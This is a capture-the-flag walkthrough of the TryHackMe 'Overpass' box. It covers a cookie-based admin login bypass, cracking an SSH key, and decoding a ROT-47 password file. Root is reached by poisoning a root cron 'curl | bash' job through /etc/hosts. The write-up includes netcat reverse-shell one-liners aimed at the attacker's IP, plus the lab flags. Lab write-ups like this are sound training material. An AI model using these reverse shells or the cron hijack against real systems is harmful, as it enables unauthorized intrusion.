@@ -1,0 +1,438 @@
+OVERPASS.
+
+
+
+
+RECON: PORT SCAN.
+Initial quick port scan:
+nmap -sS -T4 -sV 10.10.26.163
+OUTPUT:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+RECON: WEB SOURCE CODE.
+Note:
+Unsure what to do next, I inspect the source code of the site, finding the following comment. 
+OUTPUT:
+    <p>Overpass allows you to securely store different
+                passwords for every service, protected using military grade
+                <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
+                cryptography to keep you safe.
+            </p>
+
+
+
+
+RECON: WEB EXPLORING.
+On the download section, we find the files buildscript.sh and overpass.go. Reading overpass.go we find:
+//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
+So, overpass uses ROT-47
+
+
+
+
+RECON: DIRECTORY SCAN.
+Gobuster quick scan:
+gobuster dir -u http://10.10.26.163 -w /usr/share/wordlists/dirb/common.txt
+OUTPUT:
+/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+/admin                (Status: 301) [Size: 42] [--> /admin/]
+/css                  (Status: 301) [Size: 0] [--> css/]
+/downloads            (Status: 301) [Size: 0] [--> downloads/]
+/img                  (Status: 301) [Size: 0] [--> img/]
+/index.html           (Status: 301) [Size: 0] [--> ./]
+Progress: 4614 / 4615 (99.98%)
+
+
+
+
+
+Unsure what to do next, we check the clue. 
+OUTPUT:
+OWASP Top 10 Vuln! Do NOT bruteforce.
+RECON: FILE SCAN.
+Gobuster file scan (medium):
+gobuster dir -u http://10.10.26.163 -s 200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+OUTPUT:
+/index.html           (Status: 301) [Size: 0] [--> ./]
+/404.html             (Status: 200) [Size: 782]
+/.                    (Status: 301) [Size: 0] [--> /]
+/admin.html           (Status: 200) [Size: 1525]
+/main.css             (Status: 200) [Size: 982]
+/main.js              (Status: 200) [Size: 28]
+Progress: 17129 / 17130 (99.99%)
+
+
+Note:
+Sine we didn't find anything interesting, we will retry with a bigger wordlist.
+Gobuster file scan (large):
+gobuster dir -u http://10.10.26.163 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+OUTPUT:
+/index.html           (Status: 301) [Size: 0] [--> ./]
+/404.html             (Status: 200) [Size: 782]
+/.                    (Status: 301) [Size: 0] [--> /]
+/admin.html           (Status: 200) [Size: 1525]
+/main.css             (Status: 200) [Size: 982]
+/main.js              (Status: 200) [Size: 28]
+Progress: 37050 / 37051 (100.00%)
+Note:
+/login.js isn't displayed, but is on the site.
+
+
+
+
+ADMIN PORTAL: COOKIE.
+content of login.js. OUTPUT:
+async function postData(url = '', data = {}) {
+    // Default options are marked with *
+    const response = await fetch(url, {
+        method: 'POST', // *GET, POST, PUT, DELETE, etc.
+        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
+        credentials: 'same-origin', // include, *same-origin, omit
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        redirect: 'follow', // manual, *follow, error
+        referrerPolicy: 'no-referrer', // no-referrer, *client
+        body: encodeFormData(data) // body data type must match "Content-Type" header
+    });
+    return response; // We don't always want JSON back
+}
+const encodeFormData = (data) => {
+    return Object.keys(data)
+        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
+        .join('&');
+}
+function onLoad() {
+    document.querySelector("#loginForm").addEventListener("submit", function (event) {
+        //on pressing enter
+        event.preventDefault()
+        login()
+    });
+}
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+
+
+As the code shows, anyone with the cookie SessionToken will be able to log in.
+To change our cookie, we do the following steps:
+1. Create SessionToken cookie with any value: document.cookie = "SessionToken=anything1; path=/"
+2. Open inspect tab.
+3. > application.
+4. > storage.
+5. > cookies.
+6. > http://10.10.26.163
+Our new cookie shows up. 
+
+
+After we reload the site, it appears we have gotten past the portal.
+OUTPUT:
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+
+
+
+SSH AS JAMES:
+We create james_id to store his key, and give it adequate permissions:
+chmod 600 james_id
+
+
+Note:
+We are missing the password. Based on Paradox's note we can see that the RSA key should be easy to crack.
+We start by creating the hash for john:
+ssh2john james_id > james_hash.txt
+
+
+Now we can run john as usual:
+john james_hash.txt --wordlist=~/thm/rockyou.txt
+OUTPUT:
+james13          (james_id)     
+
+
+We proceed to ssh into james:
+ssh -i james_id james@10.10.10.4
+
+
+
+
+USER FLAG:
+Directory content list:
+ls
+OUTPUT:
+todo.txt  user.txt
+
+
+Check user flag:
+cat user.txt
+OUTPUT:
+thm{65c1aaf000506e56996822c6281e6bf7}
+
+
+
+
+PRIVESC:
+Our last objetive is catting the root.txt.
+Lets check the other file:
+cat todo.txt
+OUTPUT:
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+
+
+We get a hint that james is using Overpass. Lets verify:
+ls ~/.overpass
+OUTPUT:
+/home/james/.overpass
+
+
+We have found it. We also know how Overpass works:
+1. Ciphers passwords with ROT-47.
+2. Stores passwords in ~/.overpass
+We need to cat it:
+cat ~/.overpass
+OUTPUT:
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
+
+
+We create a python script to decipher:
+import sys
+
+def rot47(s):
+    return ''.join([chr(33 + ((ord(c) + 14) % 94)) if 33 <= ord(c) <= 126 else c for c in s])
+
+with open(sys.argv[1]) as f:
+    print(rot47(f.read()))
+
+
+Then run it:
+python3 dec_rot47.py ~/.overpass
+OUTPUT:
+[{"name":"System","pass":"saydrawnlyingpicture"}]
+Note:
+We were lucky, since we didn't even check if james had python installed.
+
+
+We check the users on the machine:
+ls /home
+OUTPUT:
+james  tryhackme
+
+
+Attempt System and system as login just in case:
+su - system
+OUTPUT:
+No passwd entry for user 'system'
+su - System
+OUTPUT:
+No passwd entry for user 'System'
+Note:
+The website /admin portal also gives error.
+
+
+Note:
+Out of ideas, we try to check james sudo permissions, but we need to know his password.
+Trying a non-sudo alternative:
+find / -perm -4000 -type f 2>/dev/null
+OUTPUT:
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/mount
+/bin/ping
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+
+
+POSIX-compliant reverse shell:
+Command:
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.23.25.109 4444 > /tmp/f" | at now
+Explanation:
+1. echo: prints string inside quotes to standard output. We put shell commands between the ; 	
+2. rm /tmp/f: remove said file if exists (avoids conflicts).
+3. mkfifo /tmp/f: create pipe (FIFO). A FIFO allows processes to communicate via a special file.
+4. cat /tmp/f | /bin/sh -i 2>&1 | nc 10.23.25.109 4444 > /tmp/f: 
+4.1. cat /tmp/f: reads data from FIFO.
+4.2. | bin/sh -i: pipes data into interactive shell, that reads and executes commands.
+4.3. 2>&1: redirects shell's standard error (stderr) to standard output (stdout) so errors also go through pipeline.
+4.4. | nc 10.23.25.109: pipes shell's output to netcat.
+4.5. > /tmp/f: redirects anything received from nc back to FIFO (/tmp/f).
+5. | at now: whole string printed by echo is piped into at, which schedules command to run immediatly as a job.
+Note:
+This was just a practice exercise, not necessary for ctf.
+
+
+
+
+LINPEAS.
+Out of ideas, we try to run linpeas.
+
+
+Server on attacker:
+python3 -m http.server 8000
+
+
+Download from attacked:
+get http://10.23.25.109:8000/linpeas.sh
+
+
+Add permissions and run:
+chmod +x linpeas.sh
+./linpeas.sh > linpeas_output.txt 2>&1
+
+
+We attempt to exploit pkexec (CVE-2021-4034):
+pkexec /bin/sh
+OUTPUT:
+pkexec /bin/sh
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/bin/sh' as the super user
+Authenticating as: tryhackme
+Password: 
+
+
+James talks about automated tasks. So we Check crontab:
+crontab -l
+OUTPUT:
+no crontab for james
+
+
+All users:
+cat /etc/usrs/crontab
+OUTPUT:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+Note:
+This means every minute, as root, machine downloads buildscript.sh and then runs it.
+Knowing we can edit the file, it's easy to see the next step.
+
+
+
+First, check script:
+GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
+## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
+## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
+## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
+## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
+echo "$(date -R) Builds completed" >> /root/buildStatus
+Note:
+Just the same seutp file as on the site.
+
+
+Note:
+The file is stored at the site (http://10.10.10.4/downloads/src/).  We need to redirect the domain to our ip.
+According to linpeas we can edit /etc/hosts, so we can just replace the IP.
+Check current hosts:
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+127.0.0.1 overpass.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+Creating fake server from attacking machine:
+mkdir -p downloads/src
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <10.23.25.109> 1234 >/tmp/f" > downloads/src/buildscript.sh
+sudo python3 -m http.server 80
+ON NEW TERMINAL: nc -lvnp 1234
+
+
+Now we can edit the hosts file, to make the change:
+127.0.0.1 overpass.thm -> 10.23.25.109 overpass.thm
+
+
+Note:
+After last step, we just wait for the root shell to popup on our nc panel.
+
+
+Check flag:
+cat /root/root.txt
+OUTPUT:
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+
